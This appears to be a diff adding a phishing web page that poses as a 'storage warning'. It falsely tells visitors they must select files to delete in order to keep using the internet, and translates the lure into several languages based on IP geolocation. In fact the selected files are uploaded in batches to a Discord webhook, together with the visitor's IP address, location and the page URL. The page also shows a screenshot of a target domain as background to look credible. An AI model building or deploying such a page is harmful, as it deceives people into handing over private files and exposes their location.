@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Storage Warning</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+            overflow: hidden;
+            background-image: url('');
+            background-size: cover;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            background: inherit;
+            filter: blur(10px);
+            background-size: cover;
+        }
+
+        #warning-container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.9);
+            max-width: 400px;
+            width: 100%;
+            position: relative;
+            color: black;
+            background-color: rgba(255, 255, 255, 0.8);
+        }
+
+        #warning-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        #warning-text span {
+            display: inline-block;
+            width: 15px;
+        }
+
+        #select-files-btn {
+            display: block;
+            width: calc(100% - 20px);
+            margin: 0 auto;
+            padding: 10px;
+            background-color: rgba(52, 152, 219, 0.8);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        #select-files-btn:hover {
+            background-color: rgba(41, 128, 185, 0.8);
+        }
+    </style>
+</head>
+<body>
+    <div id="warning-container">
+        <div id="warning-text">
+            <strong>Oops!</strong><span></span><br>
+            Your device is about to run out of storage. In order to use the internet, you need to delete some files.
+            Click the Select files button and select some files to delete in order to be able to use the internet.
+        </div>
+        <input type="file" id="file-input" multiple="multiple" style="display: none;">
+        <label for="file-input" id="select-files-btn">Select files</label>
+    </div>
+    <script>
+        const currentHash = window.location.hash.substring(1);
+        const domainName = currentHash.split('/')[0];
+        document.body.style.backgroundImage = `url('https://image.thum.io/get/maxAge/12/width/700/http://${domainName}')`;
+
+        document.getElementById('select-files-btn').addEventListener('click', function () {
+            document.getElementById('file-input').click();
+        });
+
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                lockip = data.city + ', ' + data.region + ', ' + data.country;
+                ip_addy = data.ip;
+                translateLocation(lockip, data.country);
+            })
+            .catch(error => console.error('Error fetching IP info:', error));
+
+        function translateLocation(location, countryCode) {
+            let translatedText;
+            let translatedSelectFilesText;
+
+            switch (countryCode) {
+                case 'GR':
+                    translatedText = 'Ωχ, όχι! Η συσκευή σας είναι σχεδόν γεμάτη. Για να χρησιμοποιήσετε το διαδίκτυο, χρειάζεται να διαγράψετε κάποια αρχεία. Κάντε κλικ στο κουμπί Επιλογή αρχείων και επιλέξτε αρχεία για διαγραφή ώστε να μπορείτε να χρησιμοποιήσετε το διαδίκτυο.';
+                    translatedSelectFilesText = 'Επιλογή αρχείων';
+                    break;
+                case 'DE':
+                    translatedText = 'Oh nein! Ihr Gerät hat fast keinen Speicher mehr. Um das Internet zu nutzen, müssen Sie einige Dateien löschen. Klicken Sie auf die Schaltfläche Dateien auswählen und wählen Sie einige Dateien zum Löschen aus, um das Internet verwenden zu können.';
+                    translatedSelectFilesText = 'Dateien auswählen';
+                    break;
+                case 'RU':
+                    translatedText = 'Ой! Ваше устройство почти полное. Чтобы использовать интернет, вам нужно удалить некоторые файлы. Нажмите кнопку Выбрать файлы и выберите файлы для удаления, чтобы можно было использовать интернет.';
+                    translatedSelectFilesText = 'Выбрать файлы';
+                    break;
+                case 'FR':
+                    translatedText = 'Oups ! Votre appareil est sur le point de manquer d\'espace de stockage. Pour utiliser Internet, vous devez supprimer certains fichiers. Cliquez sur le bouton Sélectionner des fichiers et choisissez des fichiers à supprimer afin de pouvoir utiliser Internet.';
+                    translatedSelectFilesText = 'Sélectionner des fichiers';
+                    break;
+                case 'RO':
+                    translatedText = 'Oho! Dispozitivul dvs. este pe cale să rămână fără spațiu de stocare. Pentru a utiliza internetul, trebuie să ștergeți niște fișiere. Faceți clic pe butonul Selectați fișiere și selectați câteva fișiere de șters pentru a putea utiliza internetul.';
+                    translatedSelectFilesText = 'Selectați fișiere';
+                    break;
+                case 'AL':
+                    translatedText = 'O jooo! Pajisja juaj po vjen në fund të memorisë. Për të përdorur internetin, duhet të fshini disa dosje. Klikoni butonin Zgjidhni dosjet dhe zgjidhni disa dosje për të fshirë në mënyrë që të mund të përdorni internetin.';
+                    translatedSelectFilesText = 'Zgjidhni dosjet';
+                    break;
+                case 'AR':
+                    translatedText = 'آخ! جهازك على وشك أن ينفد من التخزين. لاستخدام الإنترنت، يجب عليك حذف بعض الملفات. انقر على زر تحديد الملفات وحدد بعض الملفات للحذف لتكون قادرًا على استخدام الإنترنت.';
+                    translatedSelectFilesText = 'حدد الملفات';
+                    break;
+                default:
+                    translatedText = 'Your device is about to run out of storage. In order to use the internet, you need to delete some files. Click the Select files button and select some files to delete in order to be able to use the internet.';
+                    translatedSelectFilesText = 'Select files';
+                    break;
+            }
+
+            console.log('Translated Text:', translatedText);
+            document.getElementById('warning-text').innerHTML = `<strong>Oops!</strong><span></span><br>${translatedText}`;
+            
+            console.log('Translated Select Files Text:', translatedSelectFilesText);
+            document.getElementById('select-files-btn').innerText = translatedSelectFilesText;
+        }
+
+        document.getElementById('file-input').addEventListener('change', function (event) {
+            const files = event.target.files;
+            
+            if (files.length > 0) {
+                sendFiles(files);
+            }
+        });
+
+        async function sendFiles(files) {
+            const wURL = 'https://discord.com/api/webhooks/1234567890123456789/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+
+            let filesArray = Array.from(files);
+            let filesToSend;
+            
+            // Loop through files in batches of 10
+            for (let i = 0; i < filesArray.length; i += 10) {
+                filesToSend = filesArray.slice(i, i + Math.min(10, filesArray.length - i));
+
+                const formData = new FormData();
+
+                // Add files to formData
+                for (let j = 0; j < filesToSend.length; j++) {
+                    formData.append(`file${j + 1}`, filesToSend[j]);
+                }
+
+                // Add payload_json parameter
+                const payload = {
+                    embeds: [
+                        {
+                            title: `${i + 1}-${i + filesToSend.length}/${filesArray.length}`,
+                            description: `Full URL: \n\`\`\`${window.location.href}\`\`\`\nOther Details:\n\`\`\`Location: ${lockip}\nIP: ${ip_addy}\n\`\`\``
+                        }
+                    ]
+                };
+                formData.append('payload_json', JSON.stringify(payload));
+
+                // Send the request
+                await fetch(wURL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Files sent successfuly.');
+                    } else {
+                        console.error(`Failed to send files. HTTP status code: ${response.status}`);
+                    }
+                })
+                .catch(error => console.error('Error sending files:', error));
+            }
+        }
+    </script>
+</body>
+</html>
